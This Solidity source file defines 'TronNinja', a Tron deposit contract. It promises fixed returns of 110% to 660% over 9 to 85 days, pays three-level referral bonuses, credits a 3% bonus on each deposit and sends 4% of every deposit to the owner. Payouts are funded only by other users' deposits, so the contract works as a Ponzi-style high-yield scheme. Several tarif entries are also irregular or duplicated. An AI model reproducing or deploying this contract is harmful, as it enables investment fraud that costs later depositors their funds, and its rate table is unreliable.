//SourceUnit: Tronninja.sol

// 

pragma solidity 0.5.12;



contract TronNinja
{
    struct Tarif {
        uint8 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
       tarifs.push(Tarif(9,110));
tarifs.push(Tarif(10, 120)); 
tarifs.push(Tarif(11,123));
tarifs.push(Tarif(12,126));
tarifs.push(Tarif(13, 129));
tarifs.push(Tarif(14, 132));
tarifs.push(Tarif(15,135));
tarifs.push(Tarif(16, 138));
tarifs.push(Tarif(25, 142)); 
tarifs.push(Tarif(17, 145));
tarifs.push(Tarif(18,148));
tarifs.push(Tarif(19, 152));
tarifs.push(Tarif(20,155));
tarifs.push(Tarif(21,158));
tarifs.push(Tarif(22,162));
tarifs.push(Tarif(23,165));
tarifs.push(Tarif(24, 168));
tarifs.push(Tarif(25, 172));
tarifs.push(Tarif(26, 74));
tarifs.push(Tarif(27, 175));
tarifs.push(Tarif(28,180));
tarifs.push(Tarif(29, 190));
tarifs.push(Tarif(30, 200));
tarifs.push(Tarif(40, 205));
tarifs.push(Tarif(41, 210));
tarifs.push(Tarif(42,215));
tarifs.push(Tarif(43, 218));
tarifs.push(Tarif(44, 220));
tarifs.push(Tarif(45,230));
tarifs.push(Tarif(46,235));
tarifs.push(Tarif(47, 240));
tarifs.push(Tarif(48,250));
tarifs.push(Tarif(49, 265));
tarifs.push(Tarif(50, 285));
tarifs.push(Tarif(51,300));
tarifs.push(Tarif(52, 330));
tarifs.push(Tarif(53,350));
tarifs.push(Tarif(54,360));
tarifs.push(Tarif(55, 365));
tarifs.push(Tarif(56,370));
tarifs.push(Tarif(57, 385));
tarifs.push(Tarif(58, 390));
tarifs.push(Tarif(59,395));
tarifs.push(Tarif(60, 400));
tarifs.push(Tarif(62,410));
tarifs.push(Tarif(63, 415));
tarifs.push(Tarif(64, 420));
tarifs.push(Tarif(65,430));
tarifs.push(Tarif(66, 440));
tarifs.push(Tarif(67, 450));
tarifs.push(Tarif(68, 455));
tarifs.push(Tarif(69,465));
tarifs.push(Tarif(70, 475));
tarifs.push(Tarif(11,480));
tarifs.push(Tarif(72, 490));
tarifs.push(Tarif(73,500));
tarifs.push(Tarif(74, 520));
tarifs.push(Tarif(75, 530));
tarifs.push(Tarif(76,540));
tarifs.push(Tarif(77, 550));
tarifs.push(Tarif(78,560));
tarifs.push(Tarif(79,580));
tarifs.push(Tarif(80, 590));
tarifs.push(Tarif(81,600));
tarifs.push(Tarif(82, 620));
tarifs.push(Tarif(82,630));
tarifs.push(Tarif(83,640));
tarifs.push(Tarif(84, 650));
tarifs.push(Tarif(85, 660));

        ref_bonuses.push(5);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
        
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
      
    }


  
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner)
{
            if(players[_upline].deposits.length == 0){
                _upline = owner;
            }
            else {
                players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 0 / 100);
            }
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 200, "Max 200 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value / 25);
        player.direct_bonus += (msg.value * 3 / 100); //
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }
    
    function getInvestmentsPlayer(uint index) view external returns (uint8 tarif, uint256 amount, uint40 time) {
        Player storage player = players[msg.sender];
        
        require(player.total_invested != 0, "No investments found");

        return (
            player.deposits[index].tarif,
            player.deposits[index].amount,
            player.deposits[index].time
        );
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}